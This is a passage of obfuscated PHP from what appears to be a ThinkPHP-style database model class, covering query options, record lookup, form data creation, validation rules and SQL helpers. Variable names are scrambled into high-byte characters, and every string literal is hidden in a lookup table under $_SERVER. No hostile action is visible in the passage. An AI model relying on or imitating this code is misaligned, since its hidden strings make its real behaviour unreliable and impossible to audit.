$this->options = array_merge($this->options, $Äï •ä); } } protected function _parseOptions($ÁéÍ§ê­ = array()) { $şü†½óÛ =& $_SERVER[‰‰Ş‚€]; if (is_array($ÁéÍ§ê­)) { $ÁéÍ§ê­ = array_merge($this->options, $ÁéÍ§ê­); } $this->options = array(); if (!isset($ÁéÍ§ê­[$şü†½óÛ[366]])) { $ÁéÍ§ê­[$şü†½óÛ[366]] = $this->getTableName(); $Ìò­¿¢¶ = $this->fields; } else { $Ìò­¿¢¶ = $this->getDbFields(); } if (!empty($ÁéÍ§ê­[$şü†½óÛ[367]])) { $ÁéÍ§ê­[$şü†½óÛ[366]] .= $şü†½óÛ[63] . $ÁéÍ§ê­[$şü†½óÛ[367]]; } $ÁéÍ§ê­[$şü†½óÛ[368]] = $this->name; if (isset($ÁéÍ§ê­[$şü†½óÛ[362]]) && is_array($ÁéÍ§ê­[$şü†½óÛ[362]]) && !empty($Ìò­¿¢¶) && !isset($ÁéÍ§ê­[$şü†½óÛ[369]]) && !isset($ÁéÍ§ê­[$şü†½óÛ[366]])) { foreach ($ÁéÍ§ê­[$şü†½óÛ[362]] as $âÖŞœ¡ç => $æÓ˜¡) { $âÖŞœ¡ç = trim($âÖŞœ¡ç); if (in_array($âÖŞœ¡ç, $Ìò­¿¢¶, !0)) { if (is_scalar($æÓ˜¡)) { $this->_parseType($ÁéÍ§ê­[$şü†½óÛ[362]], $âÖŞœ¡ç); } } elseif (!is_numeric($âÖŞœ¡ç) && $şü†½óÛ[21] != substr($âÖŞœ¡ç, 0, 1) && !1 === strpos($âÖŞœ¡ç, $şü†½óÛ[20]) && !1 === strpos($âÖŞœ¡ç, $şü†½óÛ[347]) && !1 === strpos($âÖŞœ¡ç, $şü†½óÛ[223]) && !1 === strpos($âÖŞœ¡ç, $şü†½óÛ[295])) { unset($ÁéÍ§ê­[$şü†½óÛ[362]][$âÖŞœ¡ç]); } } } $this->_options_filter($ÁéÍ§ê­); return $ÁéÍ§ê­; } protected function _options_filter(&$ùôå¯©Ì) { } protected function _parseType(&$¤ûß•Üé, $˜éŠ†‹) { $ºÛ×ùŞá =& $_SERVER[‰‰Ş‚€]; if (empty($this->options[$ºÛ×ùŞá[370]][$ºÛ×ùŞá[14] . $˜éŠ†‹])) { $‚±¼äìÌ = strtolower($this->fields[$ºÛ×ùŞá[339]][$˜éŠ†‹]); if (!1 !== strpos($‚±¼äìÌ, $ºÛ×ùŞá[371])) { } elseif (!1 === strpos($‚±¼äìÌ, $ºÛ×ùŞá[372]) && !1 !== strpos($‚±¼äìÌ, $ºÛ×ùŞá[373])) { $¤ûß•Üé[$˜éŠ†‹] = intval($¤ûß•Üé[$˜éŠ†‹]); } elseif (!1 !== strpos($‚±¼äìÌ, $ºÛ×ùŞá[374]) || !1 !== strpos($‚±¼äìÌ, $ºÛ×ùŞá[375])) { $¤ûß•Üé[$˜éŠ†‹] = floatval($¤ûß•Üé[$˜éŠ†‹]); } elseif (!1 !== strpos($‚±¼äìÌ, $ºÛ×ùŞá[376])) { $¤ûß•Üé[$˜éŠ†‹] = (bool) $¤ûß•Üé[$˜éŠ†‹]; } } } public function find($ï“¾Í¦ = array()) { $Áˆò©øö =& $_SERVER[‰‰Ş‚€]; if (is_numeric($ï“¾Í¦) || is_string($ï“¾Í¦)) { $êâ÷£[$this->getPk()] = intval($ï“¾Í¦); $this->options[$Áˆò©øö[362]] = $êâ÷£; } $this->options[$Áˆò©øö[377]] = 1; $ï“¾Í¦ = $this->_parseOptions(); $¾È¡®×İ = $this->db->select($ï“¾Í¦); if (!1 === $¾È¡®×İ) { return !1; } if (empty($¾È¡®×İ)) { return null; } $¾ÄÅ‰»† = $¾È¡®×İ[0]; $this->_afterFind($¾ÄÅ‰»†, $ï“¾Í¦); return $¾ÄÅ‰»†; } protected function _afterFind(&$ç¥§óˆ×, $‚†›¿») { } protected function returnResult($»ÕÔòà, $¦Ë‡óòı = '') { $ä›çÌ—Â =& $_SERVER[‰‰Ş‚€]; if ($¦Ë‡óòı) { if (is_callable($¦Ë‡óòı)) { return call_user_func($¦Ë‡óòı, $»ÕÔòà); } switch (strtolower($¦Ë‡óòı)) { case $ä›çÌ—Â[378]: return json_encode($»ÕÔòà); case $ä›çÌ—Â[379]: return xml_encode($»ÕÔòà); } } return $»ÕÔòà; } public function parseFieldsMap($ÀœºÀ¢¹, $ÖæÔÑà„ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $¨ÛœˆÍ‹ => $¡Áİ¼ê¬) { if ($ÖæÔÑà„ == 1) { if (isset($ÀœºÀ¢¹[$¡Áİ¼ê¬])) { $ÀœºÀ¢¹[$¨ÛœˆÍ‹] = $ÀœºÀ¢¹[$¡Áİ¼ê¬]; unset($ÀœºÀ¢¹[$¡Áİ¼ê¬]); } } else { if (isset($ÀœºÀ¢¹[$¨ÛœˆÍ‹])) { $ÀœºÀ¢¹[$¡Áİ¼ê¬] = $ÀœºÀ¢¹[$¨ÛœˆÍ‹]; unset($ÀœºÀ¢¹[$¨ÛœˆÍ‹]); } } } } return $ÀœºÀ¢¹; } public function setField($ğ‡Ôª‘ô, $ş¥’÷ì© = '') { if (is_array($ğ‡Ôª‘ô)) { $ıÌ±«Â¸ = $ğ‡Ôª‘ô; } else { $ıÌ±«Â¸[$ğ‡Ôª‘ô] = $ş¥’÷ì©; } return $this->save($ıÌ±«Â¸); } public function setAdd($À ×¦ı®, $úçÀ´ÚÀ = 1) { $ó³âÖŠÆ =& $_SERVER[‰‰Ş‚€]; $‚çáÈØø = $À ×¦ı® . $ó³âÖŠÆ[380] . $úçÀ´ÚÀ; if ($úçÀ´ÚÀ < 0) { $‚çáÈØø = $À ×¦ı® . $úçÀ´ÚÀ; } return $this->setField($À ×¦ı®, array($ó³âÖŠÆ[381], $‚çáÈØø)); } public function getField($ÕàªŠë, $‚­´Ôğ€ = null) { $ÖÜô‹ =& $_SERVER[‰‰Ş‚€]; $éÓİ§Ãš[$ÖÜô‹[360]] = $ÕàªŠë; $éÓİ§Ãš = $this->_parseOptions($éÓİ§Ãš); $ÕàªŠë = trim($ÕàªŠë); if (strpos($ÕàªŠë, $ÖÜô‹[60])) { if (!isset($éÓİ§Ãš[$ÖÜô‹[377]])) { $éÓİ§Ãš[$ÖÜô‹[377]] = is_numeric($‚­´Ôğ€) ? $‚­´Ôğ€ : $ÖÜô‹[22]; } $”ùºãÃ = $this->db->select($éÓİ§Ãš); if (!empty($”ùºãÃ)) { $¡ú¢ñ› = explode($ÖÜô‹[60], $ÕàªŠë); $ÕàªŠë = array_keys($”ùºãÃ[0]); $ÂÚûÍÜ = array_shift($ÕàªŠë); $œÅ¾î‚­ = array_shift($ÕàªŠë); $èÔ¨¶ã¦ = array(); $‰¸‡Ø• = count($¡ú¢ñ›); foreach ($”ùºãÃ as $ÌšòÄÁÙ) { $æéïñÉ¨ = $ÌšòÄÁÙ[$ÂÚûÍÜ]; if (2 == $‰¸‡Ø•) { $èÔ¨¶ã¦[$æéïñÉ¨] = $ÌšòÄÁÙ[$œÅ¾î‚­]; } else { $èÔ¨¶ã¦[$æéïñÉ¨] = is_string($‚­´Ôğ€) ? implode($‚­´Ôğ€, $ÌšòÄÁÙ) : $ÌšòÄÁÙ; } } return $èÔ¨¶ã¦; } } else { if (!0 !== $‚­´Ôğ€) { $éÓİ§Ãš[$ÖÜô‹[377]] = is_numeric($‚­´Ôğ€) ? $‚­´Ôğ€ : 1; } if ($‚­´Ôğ€ === $ÖÜô‹[342]) { unset($éÓİ§Ãš[$ÖÜô‹[377]]); } $ÌšòÄÁÙ = $this->db->select($éÓİ§Ãš); if (!empty($ÌšòÄÁÙ)) { if ($‚­´Ôğ€ === $ÖÜô‹[342]) { return reset($ÌšòÄÁÙ[0]); } if (!0 !== $‚­´Ôğ€ && 1 == $éÓİ§Ãš[$ÖÜô‹[377]]) { return reset($ÌšòÄÁÙ[0]); } foreach ($ÌšòÄÁÙ as $ôõ¡¿î) { $„ë‰ù–Ó[] = $ôõ¡¿î[$ÕàªŠë]; } return $„ë‰ù–Ó; } } return null; } public function create($ ÏµƒÃñ = '', $Ÿ”…Şô = '') { $ß‘Ü’ø =& $_SERVER[‰‰Ş‚€]; if (empty($ ÏµƒÃñ)) { $ ÏµƒÃñ = $_POST; } elseif (is_object($ ÏµƒÃñ)) { $ ÏµƒÃñ = get_object_vars($ ÏµƒÃñ); } if (empty($ ÏµƒÃñ) || !is_array($ ÏµƒÃñ)) { $this->error = think_lang($ß‘Ü’ø[358]); return !1; } $ ÏµƒÃñ = $this->parseFieldsMap($ ÏµƒÃñ, 0); $Ÿ”…Şô = $Ÿ”…Şô ? $Ÿ”…Şô : (!empty($ ÏµƒÃñ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ß‘Ü’ø[360]])) { $ûĞâßÃÀ = $this->options[$ß‘Ü’ø[360]]; unset($this->options[$ß‘Ü’ø[360]]); } elseif ($Ÿ”…Şô == THINK_MODEL_INSERT && isset($this->insertFields)) { $ûĞâßÃÀ = $this->insertFields; } elseif ($Ÿ”…Şô == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ûĞâßÃÀ = $this->updateFields; } if (isset($ûĞâßÃÀ)) { if (is_string($ûĞâßÃÀ)) { $ûĞâßÃÀ = explode($ß‘Ü’ø[60], $ûĞâßÃÀ); } if (think_config($ß‘Ü’ø[382])) { $ûĞâßÃÀ[] = think_config($ß‘Ü’ø[383]); } foreach ($ ÏµƒÃñ as $ˆ«Úñ¶¬ => $ÖïâÍÄ¨) { if (!in_array($ˆ«Úñ¶¬, $ûĞâßÃÀ)) { unset($ ÏµƒÃñ[$ˆ«Úñ¶¬]); } } } if (!$this->autoValidation($ ÏµƒÃñ, $Ÿ”…Şô)) { return !1; } if (!$this->autoCheckToken($ ÏµƒÃñ)) { $this->error = think_lang($ß‘Ü’ø[384]); return !1; } if ($this->autoCheckFields) { $ûĞâßÃÀ = $this->getDbFields(); foreach ($ ÏµƒÃñ as $ˆ«Úñ¶¬ => $ÖïâÍÄ¨) { if (!in_array($ˆ«Úñ¶¬, $ûĞâßÃÀ)) { unset($ ÏµƒÃñ[$ˆ«Úñ¶¬]); } elseif (MAGIC_QUOTES_GPC && is_string($ÖïâÍÄ¨)) { $ ÏµƒÃñ[$ˆ«Úñ¶¬] = stripslashes($ÖïâÍÄ¨); } } } $this->autoOperation($ ÏµƒÃñ, $Ÿ”…Şô); $this->data = $ ÏµƒÃñ; return $ ÏµƒÃñ; } public function autoCheckToken($Ä¹µòíı) { $˜™—ü =& $_SERVER[‰‰Ş‚€]; if (isset($this->options[$˜™—ü[385]]) && !$this->options[$˜™—ü[385]]) { return !0; } if (think_config($˜™—ü[382])) { $à˜Â·ªò = think_config($˜™—ü[383]); if (!isset($Ä¹µòíı[$à˜Â·ªò]) || Session::get($à˜Â·ªò)) { return !1; } list($€ĞÁ½÷, $úšõŞï) = explode($˜™—ü[21], $Ä¹µòíı[$à˜Â·ªò]); if ($úšõŞï && Session::get($à˜Â·ªò . $˜™—ü[20] . $€ĞÁ½÷) === $úšõŞï) { Session::remove($à˜Â·ªò . $˜™—ü[20] . $€ĞÁ½÷); return !0; } if (think_config($˜™—ü[386])) { Session::remove($à˜Â·ªò . $˜™—ü[20] . $€ĞÁ½÷); } return !1; } return !0; } public function regex($˜±Ûì³õ, $¾©Öû) { $‰¿öŒ =& $_SERVER[‰‰Ş‚€]; $¥ó¨–×ê = array($‰¿öŒ[387] => $‰¿öŒ[388], $‰¿öŒ[389] => $‰¿öŒ[390], $‰¿öŒ[391] => $‰¿öŒ[392], $‰¿öŒ[393] => $‰¿öŒ[394], $‰¿öŒ[395] => $‰¿öŒ[396], $‰¿öŒ[397] => $‰¿öŒ[398], $‰¿öŒ[399] => $‰¿öŒ[400], $‰¿öŒ[375] => $‰¿öŒ[401], $‰¿öŒ[402] => $‰¿öŒ[403]); if (isset($¥ó¨–×ê[strtolower($¾©Öû)])) { $¾©Öû = $¥ó¨–×ê[strtolower($¾©Öû)]; } return preg_match($¾©Öû, $˜±Ûì³õ) === 1; } private function autoOperation(&$ñ‰ïÌ½‚, $¼Ÿİ°†ú) { $†øØ–‚¤ =& $_SERVER[‰‰Ş‚€]; if (!empty($this->options[$†øØ–‚¤[404]])) { $ÈÉ„—Ì¨ = $this->options[$†øØ–‚¤[404]]; unset($this->options[$†øØ–‚¤[404]]); } elseif (!empty($this->_auto)) { $ÈÉ„—Ì¨ = $this->_auto; } if (isset($ÈÉ„—Ì¨)) { foreach ($ÈÉ„—Ì¨ as $¾’ëŸÓ) { if (empty($¾’ëŸÓ[2])) { $¾’ëŸÓ[2] = THINK_MODEL_INSERT; } if ($¼Ÿİ°†ú == $¾’ëŸÓ[2] || $¾’ëŸÓ[2] == THINK_MODEL_BOTH) { switch (trim($¾’ëŸÓ[3])) { case $†øØ–‚¤[405]: case $†øØ–‚¤[406]: $ıû±¸‰Ö = isset($¾’ëŸÓ[4]) ? (array) $¾’ëŸÓ[4] : array(); if (isset($ñ‰ïÌ½‚[$¾’ëŸÓ[0]])) { array_unshift($ıû±¸‰Ö, $ñ‰ïÌ½‚[$¾’ëŸÓ[0]]); } if ($†øØ–‚¤[405] == $¾’ëŸÓ[3]) { $ñ‰ïÌ½‚[$¾’ëŸÓ[0]] = call_user_func_array($¾’ëŸÓ[1], $ıû±¸‰Ö); } else { $ñ‰ïÌ½‚[$¾’ëŸÓ[0]] = call_user_func_array(array(&$this, $¾’ëŸÓ[1]), $ıû±¸‰Ö); } break; case $†øØ–‚¤[360]: $ñ‰ïÌ½‚[$¾’ëŸÓ[0]] = $ñ‰ïÌ½‚[$¾’ëŸÓ[1]]; break; case $†øØ–‚¤[407]: if ($†øØ–‚¤[22] === $ñ‰ïÌ½‚[$¾’ëŸÓ[0]]) { unset($ñ‰ïÌ½‚[$¾’ëŸÓ[0]]); } break; case $†øØ–‚¤[408]: default: $ñ‰ïÌ½‚[$¾’ëŸÓ[0]] = $¾’ëŸÓ[1]; } if (!1 === $ñ‰ïÌ½‚[$¾’ëŸÓ[0]]) { unset($ñ‰ïÌ½‚[$¾’ëŸÓ[0]]); } } } } return $ñ‰ïÌ½‚; } protected function autoValidation($¯×’¥‡ø, $ç„ªÕŞ) { $¯äú¶”ç =& $_SERVER[‰‰Ş‚€]; if (!empty($this->options[$¯äú¶”ç[409]])) { $š–áŸ = $this->options[$¯äú¶”ç[409]]; unset($this->options[$¯äú¶”ç[409]]); } elseif (!empty($this->_validate)) { $š–áŸ = $this->_validate; } if (isset($š–áŸ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($š–áŸ as $Éœ×— => $ê¡ €¿) { if (empty($ê¡ €¿[5]) || $ê¡ €¿[5] == THINK_MODEL_BOTH || $ê¡ €¿[5] == $ç„ªÕŞ) { if (0 == strpos($ê¡ €¿[2], $¯äú¶”ç[410]) && strpos($ê¡ €¿[2], $¯äú¶”ç[411])) { $ê¡ €¿[2] = think_lang(substr($ê¡ €¿[2], 2, -1)); } $ê¡ €¿[3] = isset($ê¡ €¿[3]) ? $ê¡ €¿[3] : THINK_EXISTS_VALIDATE; $ê¡ €¿[4] = isset($ê¡ €¿[4]) ? $ê¡ €¿[4] : $¯äú¶”ç[412]; switch ($ê¡ €¿[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($¯×’¥‡ø, $ê¡ €¿)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¯äú¶”ç[22] != trim($¯×’¥‡ø[$ê¡ €¿[0]])) { if (!1 === $this->_validationField($¯×’¥‡ø, $ê¡ €¿)) { return !1; } } break; default: if (isset($¯×’¥‡ø[$ê¡ €¿[0]])) { if (!1 === $this->_validationField($¯×’¥‡ø, $ê¡ €¿)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Ò†Ğ„Å, $ŠÔãÄå“) { if (!1 === $this->_validationFieldItem($Ò†Ğ„Å, $ŠÔãÄå“)) { if ($this->patchValidate) { $this->error[$ŠÔãÄå“[0]] = $ŠÔãÄå“[2]; } else { $this->error = $ŠÔãÄå“[2]; return !1; } } return; } protected function _validationFieldItem($ŒÒŠà¹¡, $˜İÄ °) { $ñù¿„â¤ =& $_SERVER[‰‰Ş‚€]; switch (strtolower(trim($˜İÄ °[4]))) { case $ñù¿„â¤[405]: case $ñù¿„â¤[406]: $öéãá›Ê = isset($˜İÄ °[6]) ? (array) $˜İÄ °[6] : array(); if (is_string($˜İÄ °[0]) && strpos($˜İÄ °[0], $ñù¿„â¤[60])) { $˜İÄ °[0] = explode($ñù¿„â¤[60], $˜İÄ °[0]); } if (is_array($˜İÄ °[0])) { foreach ($˜İÄ °[0] as $ñĞ¼óÀï) { $ğ¥Üí©‰[$ñĞ¼óÀï] = $ŒÒŠà¹¡[$ñĞ¼óÀï]; } array_unshift($öéãá›Ê, $ğ¥Üí©‰); } else { array_unshift($öéãá›Ê, $ŒÒŠà¹¡[$˜İÄ °[0]]); } if ($ñù¿„â¤[405] == $˜İÄ °[4]) { return call_user_func_array($˜İÄ °[1], $öéãá›Ê); } else { return call_user_func_array(array(&$this, $˜İÄ °[1]), $öéãá›Ê); } case $ñù¿„â¤[413]: return $ŒÒŠà¹¡[$˜İÄ °[0]] == $ŒÒŠà¹¡[$˜İÄ °[1]]; case $ñù¿„â¤[414]: if (is_string($˜İÄ °[0]) && strpos($˜İÄ °[0], $ñù¿„â¤[60])) { $˜İÄ °[0] = explode($ñù¿„â¤[60], $˜İÄ °[0]); } $ğÎ¬èò = array(); if (is_array($˜İÄ °[0])) { foreach ($˜İÄ °[0] as $ñĞ¼óÀï) { $ğÎ¬èò[$ñĞ¼óÀï] = $ŒÒŠà¹¡[$ñĞ¼óÀï]; } } else { $ğÎ¬èò[$˜İÄ °[0]] = $ŒÒŠà¹¡[$˜İÄ °[0]]; } if (!empty($ŒÒŠà¹¡[$this->getPk()])) { $ğÎ¬èò[$this->getPk()] = array($ñù¿„â¤[415], $ŒÒŠà¹¡[$this->getPk()]); } if ($this->where($ğÎ¬èò)->find()) { return !1; } return !0; default: return $this->check($ŒÒŠà¹¡[$˜İÄ °[0]], $˜İÄ °[1], $˜İÄ °[4]); } } public function check($¯ÂÇØİœ, $†÷üÌÍµ, $è°Ç—âó = "\162\145\147\x65\170") { $¤“¬Ù†ø =& $_SERVER[‰‰Ş‚€]; $è°Ç—âó = strtolower(trim($è°Ç—âó)); switch ($è°Ç—âó) { case $¤“¬Ù†ø[17]: case $¤“¬Ù†ø[416]: $Â¿ô£ì‹ = is_array($†÷üÌÍµ) ? $†÷üÌÍµ : explode($¤“¬Ù†ø[60], $†÷üÌÍµ); return $è°Ç—âó == $¤“¬Ù†ø[17] ? in_array($¯ÂÇØİœ, $Â¿ô£ì‹) : !in_array($¯ÂÇØİœ, $Â¿ô£ì‹); case $¤“¬Ù†ø[417]: case $¤“¬Ù†ø[418]: if (is_array($†÷üÌÍµ)) { $ĞÛ‹¶‹ù = $†÷üÌÍµ[0]; $òí­º—Ô = $†÷üÌÍµ[1]; } else { list($ĞÛ‹¶‹ù, $òí­º—Ô) = explode($¤“¬Ù†ø[60], $†÷üÌÍµ); } return $è°Ç—âó == $¤“¬Ù†ø[417] ? $¯ÂÇØİœ >= $ĞÛ‹¶‹ù && $¯ÂÇØİœ <= $òí­º—Ô : $¯ÂÇØİœ < $ĞÛ‹¶‹ù || $¯ÂÇØİœ > $òí­º—Ô; case $¤“¬Ù†ø[419]: case $¤“¬Ù†ø[420]: return $è°Ç—âó == $¤“¬Ù†ø[419] ? $¯ÂÇØİœ == $†÷üÌÍµ : $¯ÂÇØİœ != $†÷üÌÍµ; case $¤“¬Ù†ø[421]: $ö¶ŒÔôÆ = mb_strlen($¯ÂÇØİœ, $¤“¬Ù†ø[422]); if (strpos($†÷üÌÍµ, $¤“¬Ù†ø[60])) { list($ĞÛ‹¶‹ù, $òí­º—Ô) = explode($¤“¬Ù†ø[60], $†÷üÌÍµ); return $ö¶ŒÔôÆ >= $ĞÛ‹¶‹ù && $ö¶ŒÔôÆ <= $òí­º—Ô; } else { return $ö¶ŒÔôÆ == $†÷üÌÍµ; } case $¤“¬Ù†ø[423]: list($ññ¼Ù¹œ, $ÙÓÁØ›) = explode($¤“¬Ù†ø[60], $†÷üÌÍµ); if (!is_numeric($ññ¼Ù¹œ)) { $ññ¼Ù¹œ = strtotime($ññ¼Ù¹œ); } if (!is_numeric($ÙÓÁØ›)) { $ÙÓÁØ› = strtotime($ÙÓÁØ›); } return NOW_TIME >= $ññ¼Ù¹œ && NOW_TIME <= $ÙÓÁØ›; case $¤“¬Ù†ø[424]: return in_array(get_client_ip(), explode($¤“¬Ù†ø[60], $†÷üÌÍµ)); case $¤“¬Ù†ø[425]: return !in_array(get_client_ip(), explode($¤“¬Ù†ø[60], $†÷üÌÍµ)); case $¤“¬Ù†ø[412]: default: return $this->regex($¯ÂÇØİœ, $†÷üÌÍµ); } } public function query($¸¶÷¢¨¼, $ş¹¬Ô¼ı = false) { $¾îòúİœ =& $_SERVER[‰‰Ş‚€]; if (!is_bool($ş¹¬Ô¼ı) && !is_array($ş¹¬Ô¼ı)) { $ş¹¬Ô¼ı = func_get_args(); array_shift($ş¹¬Ô¼ı); } $¸¶÷¢¨¼ = str_replace(array($¾îòúİœ[10], $¾îòúİœ[426]), $¾îòúİœ[63], $¸¶÷¢¨¼); $¸¶÷¢¨¼ = $this->parseSql($¸¶÷¢¨¼, $ş¹¬Ô¼ı); return $this->db->query($¸¶÷¢¨¼); } public function execute($â¸Ÿã“ó, $û±’ôËô = false) { if (!is_bool($û±’ôËô) && !is_array($û±’ôËô)) { $û±’ôËô = func_get_args(); array_shift($û±’ôËô); } $â¸Ÿã“ó = $this->parseSql($â¸Ÿã“ó, $û±’ôËô); return $this->db->execute($â¸Ÿã“ó); } protected function parseSql($€‚¨»Ú¥, $Î’¢Åù) { $¸ÍÂÙö© =& $_SERVER[‰‰Ş‚€]; if (!0 === $Î’¢Åù) { $Û¢–™™ß = $this->_parseOptions(); $€‚¨»Ú¥ = $this->db->parseSql($€‚¨»Ú¥, $Û¢–™™ß); } elseif (is_array($Î’¢Åù)) { $Î’¢Åù = array_map(array($this->db, $¸ÍÂÙö©[427]), $Î’¢Åù); $€‚¨»Ú¥ = vsprintf($€‚¨»Ú¥, $Î’¢Åù); } else { $€‚¨»Ú¥ = strtr($€‚¨»Ú¥, array($¸ÍÂÙö©[428] => $this->getTableName(), $¸ÍÂÙö©[429] => think_config($¸ÍÂÙö©[331]))); } $this->db->setModel($this->name); return $€‚¨»Ú¥; } public function db($¬ïî˜èØ = '', $ŠÌç°Ÿˆ = '', $ŒÓ¹â‘ = array()) { $à¯ôƒ„Ï =& $_SERVER[‰‰Ş‚€]; if ($à¯ôƒ„Ï[22] === $¬ïî˜èØ && $this->db) { return $this->db; } static $’†¼Ô‡Ò = array(); static $“‘ À¿´ = array(); if (!isset($“‘ À¿´[$¬ïî˜èØ]) || isset($“‘ À¿´[$¬ïî˜èØ]) && $ŠÌç°Ÿˆ && $’†¼Ô‡Ò[$¬ïî˜èØ] != $ŠÌç°Ÿˆ) { if (!empty($ŠÌç°Ÿˆ) && is_string($ŠÌç°Ÿˆ) && !1 === strpos($ŠÌç°Ÿˆ, $à¯ôƒ„Ï[18])) { $ŠÌç°Ÿˆ = think_config($ŠÌç°Ÿˆ); } $¬ïî˜èØ = think_guid($ŠÌç°Ÿˆ); $“‘ À¿´[$¬ïî˜èØ] = Db::getInstance($ŠÌç°Ÿˆ); } elseif (NULL === $ŠÌç°Ÿˆ) { $“‘ À¿´[$¬ïî˜èØ]->close(); unset($“‘ À¿´[$¬ïî˜èØ]); return; } if (!empty($ŒÓ¹â‘)) { if (is_string($ŒÓ¹â‘)) { parse_str($ŒÓ¹â‘, $ŒÓ¹â‘); } foreach ($ŒÓ¹â‘ as $ù×Ñ®Ïú => $¢ç˜) { $this->setProperty($ù×Ñ®Ïú, $¢ç˜); } } $’†¼Ô‡Ò[$¬ïî˜èØ] = $ŠÌç°Ÿˆ; $this->db = $“‘ À¿´[$¬ïî˜èØ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Í¶ƒ÷¯ü = get_class($this); if ($Í¶ƒ÷¯ü == $_SERVER[‰‰Ş‚€][430]) { return $this->name; } $this->name = substr($Í¶ƒ÷¯ü, 0, -5); } return $this->name; } public function getTableName() { $ÖÚÆø  =& $_SERVER[‰‰Ş‚€]; if (empty($this->trueTableName)) { $Í÷¿åÏì = !empty($this->tablePrefix) ? $this->tablePrefix : $ÖÚÆø [22]; if (!empty($this->tableName)) { $Í÷¿åÏì .= $this->tableName; } else { $Í÷¿åÏì .= think_parse_name($this->name); } $this->trueTableName = strtolower($Í÷¿åÏì); } return (!empty($this->dbName) ? $this->dbName . $ÖÚÆø [20] : $ÖÚÆø [22]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Şæš…®ê =& $_SERVER[‰‰Ş‚€]; return isset($this->fields[$Şæš…®ê[338]]) ? $this->fields[$Şæš…®ê[338]] : $this->pk; } public function getDbFields() { $éßô©‹ =& $_SERVER[‰‰Ş‚€]; if (isset($this->options[$éßô©‹[366]])) { $×ó–ºÓŠ = $this->db->getFields($this->options[$éßô©‹[366]]); return $×ó–ºÓŠ ? array_keys($×ó–ºÓŠ) : !1; } if ($this->fields) { $×ó–ºÓŠ = $this->fields; unset($×ó–ºÓŠ[$éßô©‹[337]], $×ó–ºÓŠ[$éßô©‹[338]], $×ó–ºÓŠ[$éßô©‹[339]], $×ó–ºÓŠ[$éßô©‹[336]]); return $×ó–ºÓŠ; } return !1; } public function data($îßã†²Û = '') { $½¥šÙ‘š =& $_SERVER[‰‰Ş‚€]; if ($½¥šÙ‘š[22] === $îßã†²Û && !empty($this->data)) { return $this->data; } if (is_object($îßã†²Û)) { $îßã†²Û = get_object_vars($îßã†²Û); } elseif (is_string($îßã†²Û)) { parse_str($îßã†²Û, $îßã†²Û); } elseif (!is_array($îßã†²Û)) { think_exception(think_lang($½¥šÙ‘š[358])); } $this->data = $îßã†²Û; return $this; } public function join($ĞæÁß™º) { $¿ƒ›â =& $_SERVER[‰‰Ş‚€]; if (is_array($ĞæÁß™º)) { $this->options[$¿ƒ›â[369]] = $ĞæÁß™º; } elseif (!empty($ĞæÁß™º)) { $this->options[$¿ƒ›â[369]][] = $ĞæÁß™º; } return $this; } public function union($èü“µ¶¾, $°³´ßğ = false) { $…¥óŠª =& $_SERVER[‰‰Ş‚€]; if (empty($èü“µ¶¾)) { return $this; } if ($°³´ßğ) { $this->options[$…¥óŠª[431]][$…¥óŠª[432]] = !0; } if (is_object($èü“µ¶¾)) { $èü“µ¶¾ = get_object_vars($èü“µ¶¾); } if (is_string($èü“µ¶¾)) { $Ïíû¾…Ò = $èü“µ¶¾; } elseif (is_array($èü“µ¶¾)) { if (isset($èü“µ¶¾[0])) { $this->options[$…¥óŠª[431]] = array_merge($this->options[$…¥óŠª[431]], $èü“µ¶¾); return $this; } else { $Ïíû¾…Ò = $èü“µ¶¾; } } else { think_exception(think_lang($…¥óŠª[358])); } $this->options[$…¥óŠª[431]][] = $Ïíû¾…Ò; return $this; } public function cache($ó £¦ê¢ = true, $¤ñ·½‹à = null, $¥Óü”šÔ = '') { $ø«òà =& $_SERVER[‰‰Ş‚€]; if (!1 !== $ó £¦ê¢) { $this->options[$ø«òà[433]] = array($ø«òà[105] => $ó £¦ê¢, $ø«òà[423] => $¤ñ·½‹à, $ø«òà[43] => $¥Óü”šÔ); } return $this; } public function field($“—Òß­ì, $•ÓòÌİó = false) { $ÉÈ“à =& $_SERVER[‰‰Ş‚€]; if (!0 === $“—Òß­ì) { $ğôé¨™ = $this->getDbFields(); $“—Òß­ì = $ğôé¨™ ? $ğôé¨™ : $ÉÈ“à[231]; } elseif ($•ÓòÌİó) { if (is_string($“—Òß­ì)) { $“—Òß­ì = explode($ÉÈ“à[60], $“—Òß­ì); } $ğôé¨™ = $this->getDbFields(); $“—Òß­ì = $ğôé¨™ ? array_diff($ğôé¨™, $“—Òß­ì) : $“—Òß­ì; } $this->options[$ÉÈ“à[360]] = $“—Òß­ì; return $this; } public function scope($ß•¯ª„ğ = '', $›ŸÇè¤» = NULL) { $¿¸Ñ¶Ä— =& $_SERVER[‰‰Ş‚€]; if ($¿¸Ñ¶Ä—[22] === $ß•¯ª„ğ) { if (isset($this->_scope[$¿¸Ñ¶Ä—[47]])) { $ÔÃãÅä = $this->_scope[$¿¸Ñ¶Ä—[47]]; } else { return $this; } } elseif (is_string($ß•¯ª„ğ)) { $˜¼½Ò­Ö = explode($¿¸Ñ¶Ä—[60], $ß•¯ª„ğ); $ÔÃãÅä = array(); foreach ($˜¼½Ò­Ö as $Ùí‹êê) { if (!isset($this->_scope[$Ùí‹êê])) { continue; } $ÔÃãÅä = array_merge($ÔÃãÅä, $this->_scope[$Ùí‹êê]); } if (!empty($›ŸÇè¤») && is_array($›ŸÇè¤»)) { $ÔÃãÅä = array_merge($ÔÃãÅä, $›ŸÇè¤»); } } elseif (is_array($ß•¯ª„ğ)) { $ÔÃãÅä = $ß•¯ª„ğ; } if (is_array($ÔÃãÅä) && !empty($ÔÃãÅä)) { $this->options = array_merge($this->options, array_change_key_case($ÔÃãÅä)); } return 